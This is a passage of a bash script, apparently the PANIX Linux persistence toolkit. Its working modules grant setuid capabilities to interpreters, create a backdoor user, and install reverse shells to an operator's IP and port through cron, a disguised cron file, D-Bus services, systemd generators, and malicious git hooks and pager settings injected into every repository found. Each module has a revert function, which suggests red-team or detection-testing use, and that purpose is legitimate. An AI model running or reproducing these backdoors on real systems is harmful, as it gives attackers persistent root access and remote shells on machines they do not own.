	usage_cap_backdoor() {
		echo "Usage: ./panix.sh --cap [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default capabilities settings"
		echo "--custom                     Use custom capabilities settings"
		echo "  --capability <capability>    Specify the capability"
		echo "  --binary <binary>            Specify the path to the binary"
        echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--capability )
				shift
				capability=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --cap --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_cap_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --cap: $1"
				echo "Try './panix.sh --cap --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	# Ensure setcap is found
	if ! command -v setcap &>/dev/null; then
		if [[ -x /sbin/setcap ]]; then
			SETCAP="/sbin/setcap"
		else
			echo "[-] setcap not found. Ensure the 'libcap2-bin' package is installed."
			exit 1
		fi
	else
		SETCAP=$(command -v setcap)
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("perl" "ruby" "php" "python" "python3" "node")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				$SETCAP cap_setuid+ep "$path"
				if [[ $? -eq 0 ]]; then
					echo "[+] Capability setuid granted to $path"
				else
					echo "[-] Failed to grant capability setuid to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $capability || -z $binary ]]; then
			echo "Error: --capability and --binary must be specified with --custom."
			echo "Try './panix.sh --cap --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			$SETCAP $capability $path
			if [[ $? -eq 0 ]]; then
				echo "[+] Capability $capability granted to $path"
			else
				echo "[-] Failed to grant capability $capability to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] Capabilities backdoor persistence established!"
}

# Revert Module: revert_cap_backdoor.sh
revert_cap() {
	usage_revert_cap() {
		echo "Usage: ./panix.sh --revert cap"
		echo "Reverts any changes made by the setup_cap_backdoor module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to escape special characters in sed patterns
	escape_sed_pattern() {
		local pattern="$1"
		# Escape |, \, /, and & characters
		printf '%s' "$pattern" | sed 's/[|\\/&]/\\&/g'
	}

	# Function to verify if a file is a regular file
	is_regular_file() {
		local file="$1"
		if [[ -f "$file" ]]; then
			return 0
		else
			return 1
		fi
	}

	# Ensure setcap is found
	if ! command -v setcap &>/dev/null; then
		if [[ -x /sbin/setcap ]]; then
			SETCAP="/sbin/setcap"
		else
			echo "[-] setcap not found. Ensure the 'libcap2-bin' package is installed."
			return 1
		fi
	else
		SETCAP=$(command -v setcap)
	fi

	# List of default binaries modified by setup_cap_backdoor
	local binaries=("perl" "ruby" "php" "python" "python3" "node")

	for bin in "${binaries[@]}"; do
		if command -v "$bin" &> /dev/null; then
			local path
			path=$(command -v "$bin") || { echo "[-] Failed to find path for $bin"; continue; }

			# Resolve symbolic links to get the real path
			if command -v realpath &>/dev/null; then
				path=$(realpath "$path") || { echo "[-] Failed to resolve realpath for $bin"; continue; }
			elif command -v readlink &>/dev/null; then
				path=$(readlink -f "$path") || { echo "[-] Failed to resolve readlink for $bin"; continue; }
			else
				echo "[-] Neither realpath nor readlink is available to resolve $bin path."
				continue
			fi

			# Check if path is a regular file
			if is_regular_file "$path"; then
				# Check if the file has any capabilities set
				if getcap "$path" &>/dev/null; then
					# Remove capabilities from the binary
					$SETCAP -r "$path"
					if [[ $? -eq 0 ]]; then
						echo "[+] Removed capabilities from $path"
					else
						echo "[-] Failed to remove capabilities from $path"
					fi
				else
					echo "[-] No capabilities set on $path. Skipping."
				fi
			else
				echo "[-] $path is not a regular file. Skipping."
			fi
		else
			echo "[-] $bin is not present on the system."
		fi
	done

	return 0
}

# Module: setup_create_new_user.sh
setup_create_new_user() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_create_user() {
		echo "Usage: ./panix.sh --create-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the password"
        echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --create-user --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_create_user
				exit 0
				;;
			* )
				echo "Invalid option for --create-user: $1"
				echo "Try './panix.sh --create-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './panix.sh --create-user --help' for more information."
		exit 1
	fi

	useradd -M $username
	echo "$username:$password" | chpasswd

	echo "[+] User persistence through the new $username user established!"
}

# Revert Module: revert_create_new_user.sh
revert_create_user() {

	echo "[!] Function setup_create_new_user does not have a revert function."
	return 1

	usage_revert_create_user() {
		echo "Usage: ./panix.sh --revert create-user"
		echo "Reverts any changes made by the setup_create_new_user module."
	}
}
# Module: setup_cron.sh
setup_cron() {
	local cron_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local name=""
	local option=""

	if ! command -v crontab &> /dev/null; then
		echo "Error: 'crontab' binary is not present. Please install 'cron' to use this mechanism."
		exit 1
	fi

	usage_cron() {
		if check_root; then
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default cron settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
			echo " --custom                     Use custom cron settings"
			echo "   --command <command>          Specify custom persistence command (no validation)"
			echo "   --name <name>                Specify custom cron job name"
			echo "   --crond                      Persist in cron.d directory"
			echo "   --crontab                    Persist in crontab file"
			echo "   --daily                      Persist in cron.daily directory"
			echo "   --hourly                     Persist in cron.hourly directory"
			echo "   --monthly                    Persist in cron.monthly directory"
			echo "   --weekly                     Persist in cron.weekly directory"
		else
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display Cron persistence examples"
			echo "--default                    Use default systemd settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
            echo "--help|-h                    Show this help message"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--crond|--daily|--hourly|--monthly|--weekly )
				if check_root; then
					option=$1
					case $option in
						--crond )
							cron_path="/etc/cron.d"
							;;
						--daily )
							cron_path="/etc/cron.daily"
							;;
						--hourly )
							cron_path="/etc/cron.hourly"
							;;
						--monthly )
							cron_path="/etc/cron.monthly"
							;;
						--weekly )
							cron_path="/etc/cron.weekly"
							;;
					esac
				else
					echo "Error: Only root users can use the $option option."
					exit 1
				fi
				;;
			--crontab )
				if check_root; then
					cron_path="/etc/crontab"
				else
					echo "Error: Only root users can use the --crontab option."
					exit 1
				fi
				;;
			--name )
				shift
				name=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --cron --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "--daily|--hourly|--monthly|--weekly:"
				echo "sudo ./panix.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
				echo ""
				echo "--crond:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
				echo ""
				echo "--crontab:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
				exit 0
				;;
			--help|-h)
				usage_cron
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if check_root; then
			cron_path="/etc/cron.d/freedesktop_timesync1"
			command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			echo "$command" > "$cron_path"

		else
			command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			(crontab -l 2>/dev/null; echo "$command") | crontab -
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --custom requires --command."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
			chmod +x "$cron_path/$name"
		elif [[ $option == "--crond" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --crond requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo "$command" > "$cron_path/$name"
		else
			echo "$command" | sudo crontab -
		fi
	else
		echo "Error: Either --default or --custom must be specified for --cron."
		echo "Try './panix.sh --cron --help' for more information."
		exit 1
	fi

	echo "[+] Cron persistence established."
}

# Revert Module: revert_cron.sh
revert_cron() {

	usage_revert_cron() {
		echo "Usage: ./panix.sh --revert cron"
		echo "Reverts any changes made by the setup_cron module."
	}

    # Check if crontab command is available
    if ! command -v crontab &> /dev/null; then
        echo "Error: 'crontab' command not found."
        return 1
    fi

    if check_root; then
        # For root user, remove the cron file in /etc/cron.d
        cron_file="/etc/cron.d/freedesktop_timesync1"
        if [[ -f "$cron_file" ]]; then
            rm -f "$cron_file"
            if [[ $? -eq 0 ]]; then
                echo "[+] Removed cron file $cron_file."
            else
                echo "[-] Failed to remove cron file $cron_file."
            fi
        else
            echo "[-] Cron file $cron_file does not exist. No action needed."
        fi
    else
        # For non-root users, remove the cron job from the user's crontab
        # Identify the command pattern to remove
        command_pattern="/bin/bash -c 'sh -i >& /dev/tcp/"

        # Get current crontab
        crontab -l > /tmp/current_cron$$ 2>/dev/null
        if [[ $? -ne 0 ]]; then
            echo "[-] No crontab for user $(whoami). No action needed."
            rm -f /tmp/current_cron$$
            return 0
        fi

        # Remove the line containing the command pattern
        grep -v "$command_pattern" /tmp/current_cron$$ > /tmp/new_cron$$

        # Install the new crontab
        crontab /tmp/new_cron$$
        if [[ $? -eq 0 ]]; then
            echo "[+] Removed cron job from user crontab."
        else
            echo "[-] Failed to update user crontab."
        fi

        # Clean up temporary files
        rm -f /tmp/current_cron$$ /tmp/new_cron$$
    fi

    return 0
}

# Module: setup_dbus.sh
setup_dbus() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	# Check that the user is root.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	# Check that D-Bus is installed by ensuring a key command exists.
	if ! command -v dbus-daemon &>/dev/null; then
		echo "Error: D-Bus does not appear to be installed or not in PATH."
		exit 1
	fi

	usage_dbus() {
		echo "Usage: ./panix.sh --dbus [OPTIONS]"
		echo "--examples                         Display command examples"
		echo "--default                          Use default reverse shell payload"
		echo "  --ip <ip>                          Specify IP address"
		echo "  --port <port>                      Specify port number"
		echo "--custom                           Use custom payload"
		echo "  --payload <payload>                Specify custom payload command"
		echo "--help|-h                          Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--payload )
				shift
				payload="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --dbus --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --dbus --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
				exit 0
				;;
			--help|-h )
				usage_dbus
				exit 0
				;;
			* )
				echo "Invalid option for --dbus: $1"
				echo "Try './panix.sh --dbus --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	# Validate that exactly one of --default or --custom is provided.
	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --dbus --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --dbus --help' for more information."
		exit 1
	fi

	# For --default, require --ip and --port.
	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --dbus --help' for more information."
			exit 1
		fi
		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown"
	fi

	# For --custom, require --payload.
	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			echo "Try './panix.sh --dbus --help' for more information."
			exit 1
		fi
	fi

	### 1. Create/Update the D-Bus service file.
	local service_file="/usr/share/dbus-1/system-services/org.panix.persistence.service"
	if [[ ! -d $(dirname "$service_file") ]]; then
		echo "Error: $(dirname "$service_file") does not exist. D-Bus may not be installed/configured."
		exit 1
	fi

	cat <<'EOF' > "$service_file"
[D-BUS Service]
Name=org.panix.persistence
Exec=/usr/local/bin/dbus-panix.sh
User=root
EOF
	echo "[+] Created/updated D-Bus service file: $service_file"

	### 2. Create/Update the payload script.
	local payload_script="/usr/local/bin/dbus-panix.sh"
	cat <<EOF > "$payload_script"
#!/bin/bash
# When D-Bus triggers this service, execute payload.
${payload}
EOF
	chmod +x "$payload_script"
	echo "[+] Created/updated payload script: $payload_script"

	### 3. Create/Update the D-Bus configuration file.
	local conf_file="/etc/dbus-1/system.d/org.panix.persistence.conf"
	if [[ ! -d $(dirname "$conf_file") ]]; then
		echo "Error: $(dirname "$conf_file") does not exist. D-Bus may not be installed/configured."
		exit 1
	fi

	cat <<'EOF' > "$conf_file"
<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN"
	"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
	<!-- Allow any user to own, send to, and access the specified service -->
	<policy context="default">
		<allow own="org.panix.persistence"/>
		<allow send_destination="org.panix.persistence"/>
		<allow send_interface="org.panix.persistence"/>
	</policy>
</busconfig>
EOF
	echo "[+] Created/updated D-Bus config file: $conf_file"

	### Final step: Restart D-Bus to apply changes.
	echo "[*] Restarting D-Bus..."
	systemctl restart dbus
	if [[ $? -eq 0 ]]; then
		echo "[+] D-Bus restarted successfully."
	else
		echo "[-] Failed to restart D-Bus. You may need to restart it manually."
	fi

	echo "[+] D-Bus persistence module completed. Test with:"
	echo "    dbus-send --system --type=method_call --dest=org.panix.persistence /org/panix/persistence org.panix.persistence.Method"
}

# Revert Module: revert_dbus.sh
revert_dbus() {
	usage_revert_dbus() {
		echo "Usage: ./panix.sh --revert dbus"
		echo "Reverts any changes made by the setup_dbus module."
	}

	# Must be executed as root.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	local service_file="/usr/share/dbus-1/system-services/org.panix.persistence.service"
	local payload_script="/usr/local/bin/dbus-panix.sh"
	local conf_file="/etc/dbus-1/system.d/org.panix.persistence.conf"

	echo "[*] Reverting D-Bus persistence module..."

	# Remove the D-Bus service file.
	if [[ -f "$service_file" ]]; then
		echo "[+] Removing D-Bus service file: $service_file..."
		rm -f "$service_file"
		echo "[+] D-Bus service file removed."
	else
		echo "[-] D-Bus service file not found: $service_file"
	fi

	# Remove the payload script.
	if [[ -f "$payload_script" ]]; then
		echo "[+] Removing payload script: $payload_script..."
		rm -f "$payload_script"
		echo "[+] Payload script removed."
	else
		echo "[-] Payload script not found: $payload_script"
	fi

	# Remove the D-Bus configuration file.
	if [[ -f "$conf_file" ]]; then
		echo "[+] Removing D-Bus configuration file: $conf_file..."
		rm -f "$conf_file"
		echo "[+] D-Bus configuration file removed."
	else
		echo "[-] D-Bus configuration file not found: $conf_file"
	fi

	# Restart D-Bus to apply the changes.
	echo "[*] Restarting D-Bus..."
	systemctl restart dbus
	if [[ $? -eq 0 ]]; then
		echo "[+] D-Bus restarted successfully."
	else
		echo "[-] Failed to restart D-Bus. You may need to restart it manually."
	fi

	echo "[+] D-Bus persistence reverted."
	return 0
}

# Module: setup_generator_persistence.sh
setup_generator_persistence() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_generator() {
		echo "Usage: ./panix.sh --generator [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --generator --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_generator
				exit 0
				;;
			* )
				echo "Invalid option for --generator: $1"
				echo "Try './panix.sh --generator --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --generator --help' for more information."
		exit 1
	fi

	# Create the /usr/lib/systemd/system-generators/makecon file
	cat <<-EOF > /usr/lib/systemd/system-generators/makecon
	#!/bin/bash
	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
	EOF

	chmod +x /usr/lib/systemd/system-generators/makecon

	# Create the /usr/lib/systemd/system-generators/generator file
	cat <<-EOF > /usr/lib/systemd/system-generators/generator
	#!/bin/sh
	# Create a systemd service unit file in the late directory
	cat <<-EOL > "/run/systemd/system/generator.service"
	[Unit]
	Description=Generator Service

	[Service]
	ExecStart=/usr/lib/systemd/system-generators/makecon
	Restart=always
	RestartSec=10

	[Install]
	WantedBy=multi-user.target
	EOL

	mkdir -p /run/systemd/system/multi-user.target.wants/
	ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service

	# Ensure the script exits successfully
	exit 0
	EOF

	chmod +x /usr/lib/systemd/system-generators/generator

	# Reload systemd and enable the generator service
	systemctl daemon-reload
	systemctl enable generator

	echo "[+] Systemd Generator persistence established!"
}

# Revert Module: revert_generator_persistence.sh
revert_generator() {
	usage_revert_generator() {
		echo "Usage: ./panix.sh --revert generator"
		echo "Reverts any changes made by the setup_generator_persistence module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Stop the 'generator' service if it's running
	if systemctl is-active --quiet generator.service; then
		echo "[+] Stopping 'generator' service..."
		systemctl stop generator.service
	else
		echo "[-] 'generator' service is not running."
	fi

	# Disable the 'generator' service
	if systemctl is-enabled --quiet generator.service; then
		echo "[+] Disabling 'generator' service..."
		systemctl disable generator.service
	else
		echo "[-] 'generator' service is not enabled."
	fi

	# Remove the scripts
	if [[ -f /usr/lib/systemd/system-generators/makecon ]]; then
		echo "[+] Removing /usr/lib/systemd/system-generators/makecon..."
		rm -f /usr/lib/systemd/system-generators/makecon
	else
		echo "[-] /usr/lib/systemd/system-generators/makecon not found. Skipping."
	fi

	if [[ -f /usr/lib/systemd/system-generators/generator ]]; then
		echo "[+] Removing /usr/lib/systemd/system-generators/generator..."
		rm -f /usr/lib/systemd/system-generators/generator
	else
		echo "[-] /usr/lib/systemd/system-generators/generator not found. Skipping."
	fi

	# Remove the systemd service unit file
	if [[ -f /run/systemd/system/generator.service ]]; then
		echo "[+] Removing /run/systemd/system/generator.service..."
		rm -f /run/systemd/system/generator.service
	else
		echo "[-] /run/systemd/system/generator.service not found. Skipping."
	fi

	# Remove the symlink
	if [[ -L /run/systemd/system/multi-user.target.wants/generator.service ]]; then
		echo "[+] Removing symlink /run/systemd/system/multi-user.target.wants/generator.service..."
		rm -f /run/systemd/system/multi-user.target.wants/generator.service
	else
		echo "[-] Symlink /run/systemd/system/multi-user.target.wants/generator.service not found. Skipping."
	fi

	# Reload systemd daemon
	echo "[+] Reloading systemd daemon..."
	systemctl daemon-reload

	# Kill any lingering processes started by 'makecon'
	echo "[+] Killing any lingering 'makecon' processes..."
	pkill -f "/usr/lib/systemd/system-generators/makecon"

	return 0
}

# Module: setup_git_persistence.sh
setup_git_persistence() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local hook=0
	local pager=0
	local path=""
	local command=""

	usage_git() {
		echo "Usage: ./panix.sh --git [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--custom 				       Use custom Git settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --path <path>                Specify custom path"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--hook )
				hook=1
				;;
			--pager )
				pager=1
				;;
			--path )
				shift
				path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
				echo ""
				echo "--custom:"
				echo "./panix.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
				echo ""
				echo "./panix.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
				exit 0
				;;
			--help|-h)
				usage_git
				exit 0
				;;
			* )
				echo "Invalid option for --git: $1"
				echo "Try './panix.sh --git --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: --default or --custom must be specified."
		echo "Try './panix.sh --git --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

	# Function to add malicious pre-commit hook
	add_malicious_pre_commit() {
		local git_repo="$1"
		local pre_commit_file="$git_repo/.git/hooks/pre-commit"

		if [[ ! -f $pre_commit_file ]]; then
			echo "#!/bin/bash" > $pre_commit_file
			echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
			chmod +x $pre_commit_file
			echo "[+] Created malicious pre-commit hook in $git_repo"
		else
			echo "[-] Pre-commit hook already exists in $git_repo"
		fi
	}

	# Function to add malicious pager configuration
	add_malicious_pager() {
		local git_repo="$1"
		local git_config="$git_repo/.git/config"
		local user_git_config="$HOME/.gitconfig"

		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"

		if [[ ! -f $git_config ]]; then
			mkdir -p $git_repo/.git
			echo "[core]" > $git_config
			echo "        pager = $payload" >> $git_config
			echo "[+] Created Git config with malicious pager in $git_repo"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $git_config; then
				echo "[core]" >> $git_config
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
			echo "[+] Updated existing Git config with malicious pager in $git_repo"
		fi

		# Add to user's global config if it doesn't exist
		if [[ ! -f $user_git_config ]]; then
			echo "[core]" > $user_git_config
			echo "        pager = $payload" >> $user_git_config
			echo "[+] Created global Git config with malicious pager"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $user_git_config; then
				echo "[core]" >> $user_git_config
			fi
			# Add pager configuration under [core] section in global config
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
			echo "[+] Updated existing global Git config with malicious pager"
		fi
	}

	# Function to add custom pre-commit hook
	add_custom_pre_commit() {
		if [[ ! -f $path ]]; then
			echo "#!/bin/sh" > $path
			echo "$command" >> $path
			chmod +x $path
			echo "[+] Created custom pre-commit hook in $path"
		else
			echo "[-] Pre-commit hook already exists in $path"
		fi
	}

	# Function to add custom pager configuration
	add_custom_pager() {
		local payload="$command"

		if [[ ! -f $path ]]; then
			echo "[core]" > $path
			echo "        pager = $payload" >> $path
			echo "[+] Created custom Git config with pager in $path"
		else
			# Check if [core] section exists, add pager under it
			if ! grep -q "\[core\]" $path; then
				echo "[core]" >> $path
			fi
			# Add pager configuration under [core] section
			sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
			echo "[+] Updated existing Git config with custom pager in $path"
		fi
	}

	# Function to find Git repositories and apply chosen options
	find_git_repositories() {
		local repos=$(find / -name ".git" -type d 2>/dev/null)

		if [[ -z $repos ]]; then
			echo "[-] No Git repositories found."
		else
			for repo in $repos; do
				local git_repo=$(dirname $repo)
				if [[ $hook -eq 1 ]]; then
					add_malicious_pre_commit $git_repo
				fi
				if [[ $pager -eq 1 ]]; then
					add_malicious_pager $git_repo
				fi
			done
		fi
	}

	# Execute based on mode (default or custom)
	if [[ $default -eq 1 ]]; then
		find_git_repositories
	elif [[ $custom -eq 1 ]]; then
		if [[ $hook -eq 1 ]]; then
			add_custom_pre_commit
		elif [[ $pager -eq 1 ]]; then
			add_custom_pager
		fi
	fi
	echo "[+] Git persistence established!"
}

# Revert Module: revert_git_persistence.sh
revert_git() {
	usage_revert_git() {
		echo "Usage: ./panix.sh --revert git"
		echo "Reverts any changes made by the setup_git_persistence module."
	}

	# Function to remove malicious pre-commit hooks
	remove_malicious_pre_commit() {
		local git_repo="$1"
		local pre_commit_file="$git_repo/.git/hooks/pre-commit"

		if [[ -f $pre_commit_file ]]; then
			# Check if the pre-commit hook contains the malicious payload
			if grep -q "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/" "$pre_commit_file"; then
				rm -f "$pre_commit_file"
				echo "[+] Removed malicious pre-commit hook from $git_repo"
			else
				echo "[-] Pre-commit hook in $git_repo does not contain the malicious payload. Skipping."
			fi
		else
			echo "[-] No pre-commit hook found in $git_repo. Skipping."
		fi
	}

	# Function to remove malicious pager configurations
	remove_malicious_pager() {
		local config_file="$1"

		if [[ -f $config_file ]]; then
			# Check if the config contains the malicious pager
			if grep -q "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/" "$config_file"; then
				# Remove the malicious pager line
				sed -i "/pager = nohup setsid \/bin\/bash -c 'bash -i >& \/dev\/tcp\/.*\/.* 0>&1' > \/dev\/null 2>&1 & \\\${PAGER:-less}/d" "$config_file"
				echo "[+] Removed malicious pager configuration from $config_file"
			else
				echo "[-] No malicious pager configuration found in $config_file. Skipping."
			fi
		else
			echo "[-] Config file $config_file does not exist. Skipping."
		fi
	}

	# Function to find Git repositories and remove persistence
	find_git_repositories_and_revert() {
		local repos
		repos=$(find / -type d -name ".git" 2>/dev/null)

		if [[ -z $repos ]]; then
			echo "[-] No Git repositories found."
		else
			for repo in $repos; do
				local git_repo
				git_repo=$(dirname "$repo")
				remove_malicious_pre_commit "$git_repo"

				local git_config="$git_repo/.git/config"
				remove_malicious_pager "$git_config"
			done
		fi
	}

	# Remove malicious pager from user's global Git config
	remove_malicious_pager_global() {
		local user_git_config="$HOME/.gitconfig"
		remove_malicious_pager "$user_git_config"
	}

	# Execute the revert functions
	find_git_repositories_and_revert
	remove_malicious_pager_global

	return 0
}

# Module: setup_grub.sh
setup_grub() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	# Check that the user is root.
	if ! check_root; then
		echo "Error: This function can only be run as root."
